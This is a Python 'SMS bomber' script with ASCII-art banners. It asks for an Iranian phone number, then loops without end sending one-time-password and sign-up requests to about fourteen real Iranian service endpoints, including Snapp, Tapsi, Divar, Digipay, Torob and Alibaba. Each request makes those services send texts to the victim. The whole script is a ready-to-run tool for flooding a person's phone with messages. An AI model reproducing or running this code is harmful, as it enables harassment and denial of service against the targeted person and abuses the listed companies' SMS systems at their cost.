from colorama import Fore, init
import requests
import os
import time

# راه‌اندازی Colorama
init()


def print_slow(s):
    for char in s:
        print(char, end='', flush=True)
        time.sleep(0.05)  


print(Fore.LIGHTRED_EX + "   𝗦𝗠𝗦 𝗕𝗢𝗠𝗕𝗘𝗥 DATA")
print(Fore.LIGHTGREEN_EX + """
   ssssssssss      mmmmmmm    mmmmmmm       ssssssssss
  ss::::::::::s   mm:::::::m  m:::::::mm   ss::::::::::s
ss:::::::::::::s m::::::::::mm::::::::::mss:::::::::::::s
s::::::ssss:::::sm::::::::::::::::::::::ms::::::ssss:::::s
 s:::::s  ssssss m:::::mmm::::::mmm:::::m s:::::s  ssssss
   s::::::s      m::::m   m::::m   m::::m   s::::::s
      s::::::s   m::::m   m::::m   m::::m      s::::::s
ssssss   s:::::s m::::m   m::::m   m::::mssssss   s:::::s
s:::::ssss::::::sm::::m   m::::m   m::::ms:::::ssss::::::s
s::::::::::::::s m::::m   m::::m   m::::ms::::::::::::::s
 s:::::::::::ss  m::::m   m::::m   m::::m s:::::::::::ss
  sssssssssss    mmmmmm   mmmmmm   mmmmmm  sssssssssss
""")
from colorama import Fore,init
init()
print(Fore.BLUE+"   ")



print(Fore.LIGHTRED_EX+"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠚⠉⠀⠀⠉⠑⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⣠⠔⠋⠉⣩⣍⠉⠙⠢⣄⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢧⡜⢏⠓⠒⠚⠁⠈⠑⠒⠚⣹⢳⡸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠸⡄⠀⠀⠀⠀⠀⠀⢠⠇⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⢣⡙⢦⡀⠀⠀⢀⡰⢋⡜⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡴⠁⢀⣀⣀⣀⣙⣦⣉⣉⣋⣉⣴⣋⣀⣀⣀⡀⠈⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡸⠁⠀⢸⠀⠀⠀⠀⢀⣔⡛⠛⡲⡀⠀⠀⠀⠀⡇⠀⠈⢇⠀⠀⠀⠀
⠀⠀⠀⢠⠇⠀⠀⠸⡀⠀⠀⠀⠸⣼⠽⠯⢧⠇⠀⠀⠀⠀⡇⠀⠀⠘⡆⠀⠀⠀
⠀⠀⠀⣸⠀⠀⠀⠀⡇⠀⠀⠀⠳⢼⡦⢴⡯⠞⠀⠀⠀⢰⠀⠀⠀⠀⢧⠀⠀⠀
⠀⠀⠀⢻⠀⠀⠀⠀⡇⠀⠀⠀⢀⡤⠚⠛⢦⣀⠀⠀⠀⢸⠀⠀⠀⠀⡼⠀⠀⠀
⠀⠀⠀⠈⠳⠤⠤⣖⣓⣒⣒⣒⣓⣒⣒⣒⣒⣚⣒⣒⣒⣚⣲⠤⠤⠖⠁⠀⠀⠀
""")
print('')


phone = input("[?]Enter phone(+98**) : ")
f = "0" + phone.split("98")[1]
os.system("clear")


for i in range(1, 5):
    os.system("clear")
    print_slow(f"loading[{'■' * (i * 2)}{' ' * (8 - i * 2)}{i * 25}%]\n")
    time.sleep(1)

os.system("clear")
print("Attacking.....")


snapj = {"cellphone": phone}
digij = {"cellNumber": f, "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}}
snap2j = {"phone": f}
tapsi1 = {"credential": {"phoneNumber": f, "role": "PASSENGER"}}
divarj = {"phone": f}
emd = "send=1&cellphone=" + f
rubj = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone, "send_type": "SMS"}}
bamad = "cellNumber=" + f
ali = {"phoneNumber": f}
hamrah = {"action": "getAppViaSMS", "number": f}
arkd = {"mobile": f, "country_code": "IR", "provider_code": "RUBIKA"}


while True:
    try:
        requests.post("https://app.mydigipay.com/digipay/api/users/send-sms", json=digij)
        requests.post("https://api.snapp.ir/api/v1/sms/link", json=snap2j)
        requests.post("https://api.tapsi.cab/api/v2/user", json=tapsi1)
        requests.post("https://api.divar.ir/v5/auth/authenticate", json=divarj)
        requests.post("https://messengerg2c42.iranlms.ir/", json=rubj)
        requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=snapj)
        requests.get("https://api.binjo.ir/api/panel/get_code/" + f)
        requests.get("https://core.gap.im/v1/user/add.json?mobile=" + f)
        requests.post("https://web.emtiyaz.app/json/login", data=emd)
        requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=" + f)
        requests.post("https://bama.ir/signin-checkforcellnumber", data=bamad)
        requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json=ali)
        requests.post("https://hamrahcard.ir/wp-admin/admin-ajax.php", data=hamrah)
        requests.post("https://api.chartex.net/api/v2/user/validate", json=arkd)

    

    except Exception as e:
        print(f"An error occurred: {e}")
